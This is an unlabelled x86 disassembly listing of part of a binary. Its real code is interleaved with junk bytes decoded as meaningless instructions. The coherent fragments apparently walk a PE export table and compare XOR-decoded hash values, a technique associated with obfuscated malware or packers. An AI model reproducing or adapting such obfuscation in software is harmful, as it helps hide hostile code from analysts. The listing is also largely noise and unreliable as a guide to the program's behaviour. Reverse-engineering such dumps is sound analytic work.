  4020f7:	rcl    BYTE PTR [ebp+0x7d],1
  4020fa:	pusha  
  4020fb:	sub    BYTE PTR [ebp+0x3613709c],ah
  402101:	fwait
  402102:	cmp    eax,DWORD PTR ds:[ebx+0x2]
  402106:	mov    ah,0x9d
  402108:	sub    al,0xa5
  40210a:	sahf   
  40210b:	jo     0x4020fd
  40210d:	xor    al,0xcd
  40210f:	dec    ebp
  402110:	push   edx
  402111:	sbb    DWORD PTR [ebx],0x625c39f4
  402117:	sbb    dh,BYTE PTR [ebx]
  402119:	add    BYTE PTR [ecx],bh
  40211b:	inc    esi
  40211c:	push   esi
  40211d:	jmp    0x4020e9
  40211f:	add    eax,0x84c5af17
  402124:	sbb    al,0xc5
  402127:	(bad)  
  402128:	popa   
  402129:	stos   DWORD PTR es:[edi],eax
  40212a:	inc    esi
  40212b:	icebp  
  40212c:	pop    esi
  40212d:	cmp    DWORD PTR [ecx+ecx*1],edi
  402130:	xchg   BYTE PTR [ebx-0x33],dl
  402133:	loope  0x40212f
  402135:	dec    esp
  402136:	(bad)  
  402137:	lods   eax,DWORD PTR ds:[esi]
  402138:	clc    
  402139:	sbb    BYTE PTR [esi+0x1a51b6df],dh
  40213f:	mov    al,ds:0xd7c18c0
  402144:	push   ebp
  402145:	dec    eax
  402146:	inc    eax
  402147:	xor    bl,BYTE PTR [edi+0x4ee9e5c9]
  40214d:	out    0x61,al
  40214f:	ins    DWORD PTR es:[edi],dx
  402150:	in     al,dx
  402151:	inc    edi
  402152:	arpl   WORD PTR [ecx+0x6ab8545c],cx
  402158:	outs   dx,DWORD PTR ds:[esi]
  402159:	popf   
  40215a:	in     al,dx
  40215b:	xchg   edx,eax
  40215c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40215d:	dec    ebp
  40215e:	lahf   
  40215f:	sub    ch,0xa
  402162:	ins    BYTE PTR es:[edi],dx
  402163:	adc    eax,0xc0f65566
  402168:	jmp    0x24eb:0x88993ac
  40216f:	(bad)  
  402170:	std    
  402171:	je     0x402116
  402173:	leave  
  402174:	fiadd  DWORD PTR ds:0xc17c3cc2
  40217a:	dec    edx
  40217b:	ret    0x3f76
  40217e:	xor    eax,0xd787e3c9
  402183:	jbe    0x4021bf
  402185:	adc    cl,BYTE PTR [edi-0x48]
  402188:	loopne 0x402116
  40218a:	scas   eax,DWORD PTR es:[edi]
  40218b:	std    
  40218c:	in     al,0x6d
  40218e:	test   BYTE PTR ds:0x630e4e3c,dh
  402194:	scas   al,BYTE PTR es:[edi]
  402195:	mov    ds:0xd678fe42,al
  40219a:	add    edi,DWORD PTR [ecx]
  40219c:	ss (bad) 
  40219e:	cmp    al,0xb2
  4021a0:	dec    edx
  4021a1:	sbb    ebp,edx
  4021a3:	into   
  4021a4:	jae    0x40212a
  4021a6:	push   esp
  4021a7:	ror    bh,0x65
  4021aa:	test   eax,0xd1fd6fa2
  4021af:	jg     0x40221b
  4021b1:	das    
  4021b2:	mov    cl,0x76
  4021b4:	sbb    ebp,DWORD PTR [edi]
  4021b6:	jp     0x402227
  4021b8:	cmp    BYTE PTR ds:0xa65665d3,0xb2
  4021bf:	xor    al,0xd4
  4021c1:	pop    ss
  4021c2:	mov    eax,ds:0x77af9fc9
  4021c7:	retf   
  4021c8:	test   BYTE PTR [edi-0x40],bl
  4021cb:	stos   DWORD PTR es:[edi],eax
  4021cc:	push   0xabecace5
  4021d1:	mov    ?,eax
  4021d3:	dec    ebp
  4021d4:	pop    ebp
  4021d5:	pop    edi
  4021d6:	adc    DWORD PTR [ecx-0x15eaeb5b],edx
  4021dc:	cmp    BYTE PTR [ebp-0x165edbd2],cl
  4021e2:	in     eax,dx
  4021e3:	sbb    BYTE PTR [esp+edx*4-0x54],cl
  4021e7:	xor    ah,BYTE PTR [edx]
  4021e9:	dec    eax
  4021ea:	iret   
  4021eb:	inc    BYTE PTR ds:[edx+0x5]
  4021ef:	dec    edx
  4021f0:	in     eax,dx
  4021f1:	xchg   edx,eax
  4021f2:	cmp    DWORD PTR [edx],0xffffffa2
  4021f5:	mov    al,ds:0xc2db29d2
  4021fa:	mov    dh,0x54
  4021fc:	mov    al,0x83
  4021fe:	jl     0x40220d
  402200:	or     eax,DWORD PTR [ebp-0x4841921d]
  402206:	sub    al,0xbc
  402208:	call   0xea0d7543
  40220d:	add    ah,BYTE PTR [eax+0x62a1294f]
  402213:	enter  0x3aad,0xcd
  402217:	fdivr  DWORD PTR [ebx]
  402219:	addr16 mov ebp,0x18afc3f0
  40221f:	bnd ja 0x40225f
  402222:	into   
  402223:	ja     0x4021f8
  402225:	adc    al,0xaf
  402227:	test   eax,0x34846393
  40222c:	mov    eax,ds:0x3ae377e7
  402231:	push   ss
  402232:	repnz enter 0x2c24,0xe3
  402237:	jge    0x4021ee
  402239:	xchg   ecx,eax
  40223a:	xlat   BYTE PTR ds:[ebx]
  40223b:	lock jg 0x4021fa
  40223e:	outs   dx,BYTE PTR ds:[esi]
  40223f:	sub    eax,0xc449a6c2
  402244:	stos   BYTE PTR es:[edi],al
  402245:	sbb    ch,BYTE PTR [ebp+eiz*1+0x3c]
  402249:	and    al,0xc6
  40224b:	test   eax,0x3e93499b
  402250:	push   cs
  402251:	pop    eax
  402252:	sbb    dl,al
  402254:	retf   
  402255:	popa   
  402256:	test   BYTE PTR [esi+0x6e3574fc],dh
  40225c:	fwait
  40225d:	sbb    eax,0x14752601
  402262:	cmp    al,0xa7
  402264:	mov    WORD PTR [ebp-0x4],cx
  402268:	jmp    0x40227a
  40226d:	xor    eax,esi
  40226f:	lea    eax,[eax+ecx*1+0x327299]
  402276:	mov    WORD PTR [ebp-0x4],ax
  40227a:	mov    eax,DWORD PTR [ebp-0xc]
  40227d:	cmp    eax,ebx
  40227f:	je     0x402293
  402285:	mov    eax,DWORD PTR [ebp-0x8]
  402288:	mov    DWORD PTR [eax],0x60341e8e
  40228e:	jmp    0x4028b6
  402293:	mov    eax,DWORD PTR [ebp+0x8]
  402296:	mov    ecx,DWORD PTR [ebp-0x8]
  402299:	xor    eax,esi
  40229b:	add    eax,edi
  40229d:	cmp    DWORD PTR [ecx],eax
  40229f:	je     0x40289e
  4022a5:	mov    ecx,DWORD PTR [ebp-0x14]
  4022a8:	mov    eax,DWORD PTR [ebp-0x8]
  4022ab:	mov    eax,DWORD PTR [eax]
  4022ad:	mov    eax,DWORD PTR [eax+0x3c]
  4022b0:	lea    ecx,[ecx*8+0x78]
  4022b7:	add    eax,ecx
  4022b9:	jmp    0x40248d
  4022be:	je     0x402337
  4022c0:	int3   
  4022c1:	xchg   ecx,eax
  4022c2:	int    0xbd
  4022c4:	jne    0x402339
  4022c6:	jae    0x4022b2
  4022c8:	(bad)  
  4022c9:	psraw  mm1,0xf
  4022cd:	lock mov dh,0x3
  4022d0:	jle    0x402350
  4022d2:	mov    ch,0x7f
  4022d4:	jle    0x402354
  4022d6:	pop    es
  4022d7:	ror    ch,1
  4022d9:	or     DWORD PTR ds:0xafbe5ad4,eax
  4022df:	mov    dl,BYTE PTR [eax-0x27]
  4022e2:	xlat   BYTE PTR ds:[ebx]
  4022e3:	sbb    al,0x60
  4022e5:	jg     0x402286
  4022e7:	into   
  4022e8:	push   ebp
  4022e9:	fs gs pop edx
  4022ec:	int    0xc9
  4022ee:	jne    0x402361
  4022f0:	jmp    0x402371
  4022f2:	mov    edi,0xaefe2ddf
  4022f7:	div    esp
  4022f9:	mul    BYTE PTR [edx+edi*8]
  4022fc:	push   esi
  4022fd:	push   ss
  4022fe:	into   
  4022ff:	jns    0x402289
  402301:	mov    edi,0x7977f3f9
  402306:	xchg   esi,eax
  402307:	popa   
  402308:	or     BYTE PTR [esi],0x34
  40230b:	add    eax,edi
  40230d:	ret    
  40230e:	fdiv   DWORD PTR [ecx+0x6c4dcb39]
  402314:	or     eax,0xab6b22df
  402319:	mov    ebp,0x2bdb4ba4
  40231e:	and    esp,ecx
  402320:	ds push es
  402322:	(bad)  
  402323:	(bad)  
  402324:	lds    ebx,FWORD PTR [edi-0x263ce14c]
  40232a:	stos   DWORD PTR es:[edi],eax
  40232b:	push   esp
  40232c:	and    dh,BYTE PTR [esi+edi*1+0x69]
  402330:	ins    BYTE PTR es:[edi],dx
  402331:	pop    esp
  402332:	mov    ebx,edi
  402334:	hlt    
  402335:	mov    ebp,0x7e4ace0
  40233a:	mov    esi,0xd32dfdf7
  40233f:	clc    
  402340:	loopne 0x40230e
  402342:	clc    
  402343:	cmp    eax,0xd51455ac
  402348:	das    
  402349:	xor    WORD PTR [esi],0x345c
  40234e:	pop    ebx
  40234f:	add    edi,DWORD PTR [edi+0x3a44ef19]
  402355:	xor    DWORD PTR [edi-0x6cef4ef9],0x7e
  40235c:	dec    edi
  40235d:	ficomp DWORD PTR ds:0xc9a2a681
  402363:	mov    dl,BYTE PTR [esi+0x730e693e]
  402369:	xlat   BYTE PTR ds:[ebx]
  40236a:	push   esp
  40236b:	xor    eax,0xfd8cf8e4
  402370:	pop    eax
  402371:	jl     0x402382
  402373:	mov    ch,0xdd
  402375:	cmp    DWORD PTR [esi+ebx*8],ebp
  402378:	inc    ebp
  402379:	dec    ebx
  40237a:	imul   eax,DWORD PTR [esp+ecx*1-0x75412a86],0x1
  402382:	mov    eax,ds:0xa38c8966
  402387:	cmp    esi,DWORD PTR [ecx-0xe]
  40238a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40238b:	nop
  40238c:	std    
  40238d:	add    DWORD PTR [edi-0x3b],eax
  402390:	nop
  402391:	cmp    bh,BYTE PTR [eax+0x5fa0f453]
  402397:	xor    edi,DWORD PTR [edi+0x1f8ba845]
  40239d:	sahf   
  40239e:	aaa    
  40239f:	cmp    al,0x18
  4023a1:	xlat   BYTE PTR ds:[ebx]
  4023a2:	frstor [edx]
  4023a4:	sub    DWORD PTR [edx+0x74366a6e],ebp
  4023aa:	pop    ebp
  4023ab:	push   esp
  4023ac:	stc    
  4023ad:	jne    0x402374
  4023af:	or     ah,ah
  4023b1:	outs   dx,BYTE PTR ds:[esi]
  4023b2:	jb     0x402431
  4023b4:	inc    ecx
  4023b5:	retf   
  4023b6:	pop    eax
  4023b7:	rdtsc  
  4023b9:	mov    ah,0x21
  4023bb:	call   esp
  4023bd:	sbb    edx,DWORD PTR [ebp-0x185d70f2]
  4023c3:	into   
  4023c4:	ret    0xae0c
  4023c7:	loope  0x402394
  4023c9:	fcomp  DWORD PTR [ebx-0x62d2a4e0]
  4023cf:	mov    DWORD PTR [edx],ebp
  4023d1:	inc    eax
  4023d2:	fsubr  DWORD PTR [eax]
  4023d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023d5:	jb     0x4023ba
  4023d7:	clc    
  4023d8:	(bad)  
  4023d9:	mov    ch,0x90
  4023db:	jle    0x4023bb
  4023dd:	mov    eax,ds:0x335e953e
  4023e2:	push   esi
  4023e3:	add    DWORD PTR [edx],ecx
  4023e5:	(bad)  
  4023e6:	into   
  4023e7:	in     al,dx
  4023e8:	sar    BYTE PTR [eax+eiz*8],1
  4023eb:	retf   0x326
  4023ee:	jg     0x402467
  4023f0:	inc    edi
  4023f1:	xchg   esi,eax
  4023f2:	ss jp  0x402398
  4023f5:	xor    ebx,DWORD PTR [ebx+0x14]
  4023f8:	in     eax,dx
  4023f9:	add    cl,BYTE PTR [ecx]
  4023fb:	fdiv   QWORD PTR [eax+0x198486ae]
  402401:	jle    0x402466
  402403:	xchg   edi,eax
  402404:	shr    BYTE PTR fs:[eax],0xcc
  402408:	mov    cl,0x92
  40240a:	fisttp WORD PTR [ebx]
  40240c:	gs call 0xd7dc9ab6
  402412:	push   ds
  402413:	(bad)  
  402414:	shl    esi,1
  402416:	imul   esp,DWORD PTR [eax+0x43],0xffffffaa
  40241a:	push   ss
  40241b:	inc    eax
  40241c:	xor    DWORD PTR ds:0xf5a34a33,edx
  402422:	sbb    al,BYTE PTR [esi+eiz*8-0x22858a4e]
  402429:	loope  0x402474
  40242b:	ds hlt 
  40242d:	call   0xfc45:0x7e7a02f6
  402434:	pop    ds
  402435:	add    esp,DWORD PTR [ebp-0x6f]
  402438:	ret    0x5efb
  40243b:	pop    edx
  40243c:	adc    BYTE PTR [ebp-0x4e339a03],al
  402442:	mov    edi,0xdcfebf1d
  402447:	sbb    esp,DWORD PTR [ebp-0x5d8829f7]
  40244d:	mov    ch,0x71
  40244f:	cmp    al,0x7f
  402451:	in     al,dx
  402452:	stos   BYTE PTR es:[edi],al
  402453:	push   es
  402454:	xchg   edi,eax
  402455:	or     dh,BYTE PTR [ecx+0x51355abe]
  40245b:	(bad)  
  40245c:	cmp    eax,DWORD PTR [edx]
  40245e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40245f:	xor    BYTE PTR [eax],dh
  402461:	sbb    eax,0xbba6993
  402466:	lea    ebx,[edx+0x285e5af5]
  40246c:	and    ebp,edx
  40246e:	retf   0x3915
  402471:	sbb    DWORD PTR [ebx],esi
  402473:	in     al,dx
  402474:	nop
  402475:	mov    eax,ds:0x7c59f8b8
  40247a:	push   esp
  40247b:	ds and dl,ch
  40247e:	mov    bl,0x3e
  402480:	xor    eax,0xd29450cd
  402485:	ja     0x40244e
  402487:	xchg   DWORD PTR [eax+0x117c016],ebp
  40248d:	mov    ecx,DWORD PTR [ebp-0x8]
  402490:	mov    ecx,DWORD PTR [ecx]
  402492:	mov    eax,DWORD PTR [eax+ecx*1]
  402495:	mov    DWORD PTR [ebp-0x1c],eax
  402498:	mov    eax,DWORD PTR [ebp+0x8]
  40249b:	xor    eax,esi
  40249d:	add    eax,edi
  40249f:	mov    DWORD PTR [ebp-0x20],eax
  4024a2:	mov    eax,DWORD PTR [ebp+0x8]
  4024a5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024a8:	xor    eax,esi
  4024aa:	add    eax,edi
  4024ac:	cmp    ecx,eax
  4024ae:	je     0x4028b6
  4024b4:	mov    eax,DWORD PTR [ebp-0x8]
  4024b7:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024ba:	add    ecx,DWORD PTR [eax]
  4024bc:	jmp    0x402690
  4024c1:	xor    al,0x5a
  4024c3:	inc    edx
  4024c4:	pop    ebp
  4024c5:	pop    esp
  4024c6:	jge    0x4024fd
  4024c8:	arpl   WORD PTR [edx],ax
  4024ca:	outs   dx,BYTE PTR ds:[esi]
  4024cb:	dec    esi
  4024cc:	or     eax,0xaf227cd9
  4024d1:	in     eax,dx
  4024d2:	or     eax,0x7fb57e7e
  4024d7:	jle    0x402557
  4024d9:	int3   
  4024da:	jb     0x4024d6
  4024dc:	dec    ecx
  4024dd:	hlt    
  4024de:	icebp  
  4024df:	push   ebx
  4024e0:	sub    esi,DWORD PTR [edi+0x57]
  4024e3:	pop    esp
  4024e4:	dec    ebp
  4024e5:	fwait
  4024e6:	sub    dl,ah
  4024e8:	outs   dx,BYTE PTR ds:[esi]
  4024e9:	jno    0x4024b5
  4024eb:	in     al,dx
  4024ec:	gs (bad) 
  4024ef:	imul   esi,DWORD PTR ds:0x91b24d4d,0x7879c6df
  4024f9:	fnstcw WORD PTR [edx-0x72]
  4024fc:	fdivr  st,st(0)
  4024fe:	popa   
  4024ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402500:	in     al,dx
  402501:	enter  0xd4f4,0xec
  402505:	pop    esp
  402506:	mov    ch,0x16
  402508:	cmc    
  402509:	jge    0x4024ae
  40250b:	iret   
  40250c:	shr    BYTE PTR [edi],0x51
  40250f:	popf   
  402510:	ret    
  402511:	and    dh,BYTE PTR [ebp+0x4]
  402514:	std    
  402515:	push   0xffffff93
  402517:	in     al,dx
  402518:	aam    0x18
  40251a:	dec    eax
  40251b:	mov    dl,0x39
  40251d:	test   DWORD PTR [ebx+ecx*2+0x6079c700],eax
  402524:	or     al,al
  402526:	call   0x1365:0x875be42
  40252d:	aas    
  40252e:	dec    ebx
  40252f:	xchg   esp,eax
  402530:	mov    esi,?
  402532:	sahf   
  402533:	pop    es
  402534:	push   esi
  402535:	sub    esi,DWORD PTR ds:0xc35a6d65
  40253b:	push   edi
  40253c:	and    esp,DWORD PTR [edx+0xc7ac005]
  402542:	jbe    0x40251f
  402544:	mul    eax
  402546:	in     eax,0xb1
  402548:	and    dl,BYTE PTR [ecx]
  40254a:	jmp    0xa28311bc
  40254f:	test   ecx,ebp
  402551:	out    0xd7,eax
  402553:	pop    ecx
  402554:	pop    edx
  402555:	jmp    0xc4d9:0x930e33a1
  40255c:	dec    ecx
  40255d:	icebp  
  40255e:	rcr    DWORD PTR [ecx-0x3eac71b8],1
  402564:	out    dx,al
  402565:	mov    ?,WORD PTR [edx+0xb]
  402568:	cwde   
  402569:	jmp    0x402549
  40256b:	daa    
  40256c:	and    DWORD PTR [eax-0x3bbe3050],ebp
  402572:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402573:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402574:	das    
  402575:	xchg   ecx,eax
  402576:	cs dec edx
  402578:	ins    BYTE PTR es:[edi],dx
  402579:	mov    al,0x26
  40257b:	add    DWORD PTR ds:0x8ce3f6fb,ebp
  402581:	pop    edi
  402582:	xchg   ebx,eax
  402583:	mov    BYTE PTR [ebp-0x1c707cd6],al
  402589:	mov    al,ss:0x293bcada
  40258f:	scas   al,BYTE PTR es:[edi]
  402590:	loope  0x4025b0
  402592:	in     al,dx
  402593:	adc    esp,DWORD PTR ss:[ebx]
  402596:	inc    ebx
  402597:	maxps  xmm4,XMMWORD PTR [edi+0x1743eb9a]
  40259e:	je     0x402526
  4025a0:	cmovb  edx,DWORD PTR [esi]
  4025a3:	pop    edi
  4025a4:	jne    0x4025d3
  4025a6:	fwait
  4025a7:	das    
  4025a8:	xor    DWORD PTR [ebx+ecx*8+0xc],esi
  4025ac:	add    al,al
  4025ae:	jmp    0x68e74651
  4025b3:	jno    0x402596
  4025b5:	repnz scas eax,DWORD PTR es:[edi]
  4025b7:	cmp    DWORD PTR [ecx-0x73],esi
  4025ba:	add    eax,esp
  4025bc:	scas   al,BYTE PTR es:[edi]
  4025bd:	lock or al,0x7e
  4025c0:	pop    ds
  4025c1:	pop    ss
  4025c2:	adc    al,0xe4
  4025c4:	dec    BYTE PTR [ebp+0x634b8a70]
  4025ca:	jge    0x40256e
  4025cc:	aaa    
  4025cd:	sub    DWORD PTR [edx+0x66955e17],ecx
  4025d3:	div    ecx
  4025d5:	popa   
  4025d6:	in     al,dx
  4025d7:	adc    BYTE PTR [eax],0x8e
  4025da:	add    DWORD PTR [ebx],edx
  4025dc:	ficom  DWORD PTR [edi+0x15]
  4025df:	jb     0x402584
  4025e1:	mov    edx,ebp
  4025e3:	xchg   esp,eax
  4025e4:	gs push esp
  4025e6:	clc    
  4025e7:	fild   WORD PTR [eiz*4-0x78e19056]
  4025ee:	inc    esp
  4025ef:	mov    esi,0x99ef4ef6
  4025f4:	scas   eax,DWORD PTR es:[edi]
  4025f5:	jo     0x402623
  4025f7:	mov    WORD PTR [eax-0x4fd78dfd],gs
  4025fd:	ins    DWORD PTR es:[edi],dx
  4025fe:	pop    edi
  4025ff:	hlt    
  402600:	(bad)
  402603:	add    eax,0x353b6006
  402608:	mov    esp,ecx
  40260a:	mov    WORD PTR [edi],ss
  40260c:	fidiv  WORD PTR ds:0x97f36749
  402612:	xor    BYTE PTR [edi+0x218ad356],0x40
  402619:	repnz fistp WORD PTR [ecx+ebp*1+0xb]
  40261e:	call   0xa477:0xde7fb3d1
  402625:	dec    eax
  402626:	test   eax,0x1f27b2d4
  40262b:	icebp  
  40262c:	dec    esp
  40262d:	push   edx
  40262e:	push   ss
  40262f:	and    al,0xe1
  402631:	mov    cl,0x44
  402633:	adc    dl,bh
  402635:	add    al,0x9e
  402637:	pop    ds
  402638:	icebp  
  402639:	outs   dx,DWORD PTR ds:[esi]
  40263a:	in     eax,0x7d
  40263c:	cli    
  40263d:	int3   
  40263e:	nop
  40263f:	aas    
  402640:	int3   
  402641:	inc    edi
  402643:	outs   dx,BYTE PTR ds:[esi]
  402644:	mov    ebx,0x18851eeb
  402649:	(bad)  
  40264a:	add    al,0xe5
  40264c:	mov    ebp,0x394a1c95
  402651:	sub    BYTE PTR [edi+eiz*8+0x6a8d05fe],dh
  402658:	enter  0xb638,0x91
  40265c:	repnz sbb eax,0x5d6084f0
  402662:	jb     0x40268b
  402664:	ja     0x4026e0
  402666:	(bad)  
  402667:	call   0xdb6a:0x338424a5
  40266e:	(bad)  
  402670:	mov    esi,0x9b422bf8
  402675:	dec    esp
  402676:	or     al,0x25
  402678:	repnz mov edx,DWORD PTR [eax+0x26a850bb]
  40267f:	mov    ah,0xf
  402681:	sub    dh,ch
  402683:	and    edx,DWORD PTR ds:[ebx-0x15]
  402687:	mov    WORD PTR [ecx-0x7d],gs
  40268a:	push   0xf5d936b2
  40268f:	push   cs
  402690:	mov    DWORD PTR [ebp-0x20],ecx
  402693:	mov    eax,DWORD PTR [ebp-0x20]
  402696:	mov    ecx,DWORD PTR [ebp-0x8]
  402699:	mov    eax,DWORD PTR [eax+0xc]
  40269c:	mov    ecx,DWORD PTR [ecx]
  40269e:	mov    al,BYTE PTR [eax+ecx*1]
  4026a1:	add    al,0x3a
  4026a3:	xor    al,0x44
  4026a5:	cmp    al,0xc1
  4026a7:	je     0x402892
  4026ad:	mov    eax,DWORD PTR [ebp+0x8]
  4026b0:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b3:	xor    eax,esi
  4026b5:	add    eax,edi
  4026b7:	jmp    0x40288b
  4026bc:	ins    BYTE PTR es:[edi],dx
  4026bd:	jo     0x4026e5
  4026bf:	arpl   WORD PTR [edx],si
  4026c1:	jge    0x402730
  4026c3:	jno    0x402694
  4026c5:	adc    al,0x86
  4026c7:	mov    dl,0xa
  4026c9:	jmp    0xf64b486
  4026ce:	jle    0x40274e
  4026d0:	mov    ch,0x7f
  4026d2:	jle    0x402752
  4026d4:	inc    eax
  4026d5:	cmp    al,0xd3
  4026d7:	cdq    
  4026d8:	fcomp  QWORD PTR [esi+0x3f]
  4026db:	call   0x9f266d68
  4026e0:	mov    WORD PTR [edi+0x4e8bc82],ds
  4026e6:	rol    ecx,0x75
  4026e9:	bound  edi,QWORD PTR [edi-0xfc4c1b8]
  4026ef:	and    DWORD PTR [ebx-0x37],0x99404805
  4026f6:	sbb    al,0xb1
  4026f8:	or     BYTE PTR [esi+eax*2],cl
  4026fb:	mov    dh,0xa9
  4026fd:	ror    BYTE PTR [ebx+0x6155bdda],cl
  402703:	gs imul ecx,edi,0x4f91048a
  40270a:	mov    esp,0x30c6ede9
  40270f:	test   BYTE PTR [ecx+0x33],bl
  402712:	lahf   
  402713:	cmp    esp,DWORD PTR [edi+0x47]
  402716:	lock lahf 
  402718:	rcl    BYTE PTR ds:0x43aa0466,cl
  40271e:	stos   DWORD PTR es:[edi],eax
  40271f:	adc    al,0xe6
  402721:	clc    
  402722:	pop    esp
  402723:	stos   BYTE PTR es:[edi],al
  402724:	cmp    eax,0xf2a033fe
  402729:	pop    ds
  40272a:	test   BYTE PTR [ebx+esi*1],al
  40272d:	not    DWORD PTR [esi-0x78]
  402730:	gs ins DWORD PTR es:[edi],dx
  402732:	adc    edi,DWORD PTR [esi]
  402734:	cwde   
  402735:	stos   DWORD PTR es:[edi],eax
  402736:	fisubr WORD PTR [eax+0x60bce17c]
  40273c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40273d:	mov    bl,0xe2
  40273f:	mov    ah,0xd3
  402741:	vmread DWORD PTR [ebp-0x32],edi
  402745:	jle    0x40279c
  402747:	or     al,0xe4
  402749:	lock pusha 
  40274b:	mov    ch,0x4a
  40274d:	test   BYTE PTR [ecx-0x16b9729b],bl
  402753:	mov    ebp,?
  402755:	in     eax,dx
  402756:	push   ss
  402757:	pop    esp
  402758:	push   edi
  402759:	and    al,0xea
  40275b:	imul   ebx,ecx,0x54c830c
  402761:	xor    bl,ch
  402763:	jge    0x402709
  402765:	jecxz  0x402784
  402767:	(bad)  
  402769:	inc    ebp
  40276a:	pop    edi
  40276b:	out    dx,al
  40276c:	outs   dx,DWORD PTR ds:[esi]
  40276d:	mov    ah,0x44
  40276f:	fs popf 
  402771:	sbb    DWORD PTR [edi+0x153c7701],0x420f7353
  40277b:	stos   BYTE PTR es:[edi],al
  40277c:	xor    eax,DWORD PTR [ebx+0x330c16cc]
  402782:	dec    edx
  402783:	aaa    
  402784:	pop    esp
  402785:	les    ebp,FWORD PTR [ebp-0x1b98048a]
  40278b:	push   ss
  40278c:	jae    0x402782
  40278e:	mov    al,ah
  402790:	imul   esp,DWORD PTR [eax+0xef6c69e],0x3d
  402797:	and    BYTE PTR [ebp+0x39],0x43
  40279b:	lock dec edx
  40279d:	(bad)  
  40279e:	sub    BYTE PTR ds:0x4620839b,ah
  4027a4:	ins    DWORD PTR es:[edi],dx
  4027a5:	xlat   BYTE PTR ds:[ebx]
  4027a6:	push   es
  4027a7:	pop    ss
  4027a8:	rcl    DWORD PTR [edi-0x3eeb5c65],1
  4027ae:	adc    eax,0x36c84528
  4027b3:	dec    ebp
  4027b4:	jne    0x402829
  4027b6:	push   ss
  4027b7:	xchg   edi,eax
  4027b8:	fiadd  DWORD PTR [edx-0x660e435e]
  4027be:	in     eax,0x56
  4027c0:	mov    eax,0xcfc556b9
  4027c5:	loopne 0x40274b
  4027c7:	ror    DWORD PTR [ebp-0x2fd15b65],0xf9
  4027ce:	les    eax,FWORD PTR [ecx]
  4027d0:	in     al,0xed
  4027d2:	mov    edx,0x5534c7ae
  4027d7:	cdq    
  4027d8:	dec    edi
  4027d9:	cmp    eax,0xf233f7ea
  4027de:	fcomp  st(0)
  4027e0:	nop
  4027e1:	mov    ebx,0x2314c5e3
  4027e6:	gs es das 
  4027e9:	sbb    DWORD PTR [edx+0x11],ebp
  4027ec:	xchg   ebx,eax
  4027ed:	adc    al,0x1e
  4027ef:	ja     0x40282d
  4027f1:	cli    
  4027f2:	cmc    
  4027f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027f4:	pushf  
  4027f5:	xchg   ebp,eax
  4027f6:	mov    DWORD PTR [esi+0x150dcd82],edx
  4027fc:	push   esi
  4027fd:	sbb    BYTE PTR [eax+0x6c],al
  402800:	jg     0x402807
  402802:	and    al,0x83
  402804:	mov    cl,BYTE PTR [ebp-0x3a47dd42]
  40280a:	mov    esp,0x50f962c7
  40280f:	push   esi
  402810:	inc    edi
  402811:	mov    al,ds:0xbf73508c
  402816:	add    al,0x32
  402818:	xor    edi,esp
  40281a:	test   al,0x66
  40281c:	xchg   DWORD PTR [esi],esp
  40281e:	cdq    
  40281f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402820:	test   eax,0x635df057
  402825:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402826:	sbb    eax,0xa2ee75a7
  40282b:	test   DWORD PTR [ecx-0x5e],edx
  40282e:	imul   DWORD PTR [edi+0x60]
  402831:	(bad)  
  402832:	daa    
  402833:	int3   
  402834:	ret    0x7abc
  402837:	push   ebp
  402838:	imul   ebp,DWORD PTR [ebp-0x44],0x2907af3b
  40283f:	mov    bh,0x96
  402841:	in     al,0xbe
  402843:	or     dh,0xbc
  402846:	mov    ecx,0xa2fe2398
  40284b:	cmp    esp,DWORD PTR [edx-0x2c8cf10e]
  402851:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402852:	xchg   edi,eax
  402853:	fisttp QWORD PTR [ecx-0x6f27bb5e]
  402859:	cmp    al,0x5b
  40285b:	ss aad 0x1c
  40285e:	mov    DWORD PTR [edx],0x32614b7c
  402864:	dec    esp
  402865:	and    DWORD PTR [edi+0x4870c4c3],0xfffffffd
  40286c:	dec    eax
  40286d:	pop    esp
  40286e:	call   0xaa2a56fa
  402873:	xor    cl,BYTE PTR [edx-0x17]
  402876:	ins    BYTE PTR es:[edi],dx
  402877:	not    DWORD PTR [esi+0x5f]
  40287a:	mov    eax,0xae0ba530
  40287f:	and    cl,ah
  402881:	cdq    
  402882:	fistp  WORD PTR [edx+0x588d3111]
  402888:	lds    ecx,FWORD PTR [edx-0x7]
  40288b:	mov    DWORD PTR [ecx],eax
  40288d:	jmp    0x4028b6
  402892:	xor    DWORD PTR [ebp-0xc],0x5fd8c
  402899:	jmp    0x4028b6
  40289e:	mov    eax,DWORD PTR [ebp-0x8]
  4028a1:	mov    ecx,DWORD PTR [ebp-0x18]
  4028a4:	mov    ecx,DWORD PTR [ecx]
  4028a6:	mov    DWORD PTR [eax],ecx
  4028a8:	mov    eax,DWORD PTR [ebp+0xc]
  4028ab:	mov    eax,DWORD PTR [ebp+0x8]
  4028ae:	push   DWORD PTR [ebp-0x8]
  4028b1:	call   0x405275
  4028b6:	mov    eax,DWORD PTR [ebp-0xc]
  4028b9:	cmp    eax,ebx
  4028bb:	je     0x4015da
  4028c1:	mov    eax,DWORD PTR [ebp-0x8]
  4028c4:	mov    eax,DWORD PTR [eax]
  4028c6:	pop    edi
  4028c7:	pop    esi
  4028c8:	pop    ebx
  4028c9:	leave  
  4028ca:	ret    0xc
  4028cd:	push   ebp
  4028ce:	mov    ebp,esp
  4028d0:	sub    esp,0x18
  4028d3:	leave  
  4028d4:	ret    0x8
  4028d7:	push   ebp
  4028d8:	mov    ebp,esp
  4028da:	jmp    0x402a17
  4028df:	sbb    eax,0xb1fd9f1a
  4028e4:	jge    0x402943
  4028e6:	fidivr DWORD PTR [eax+0x67de0451]
  4028ec:	jmp    0x893f6c9
  4028f1:	jle    0x402971
  4028f3:	push   ds
  4028f4:	jg     0x402974
  4028f6:	jle    0x402926
  4028f8:	push   esp
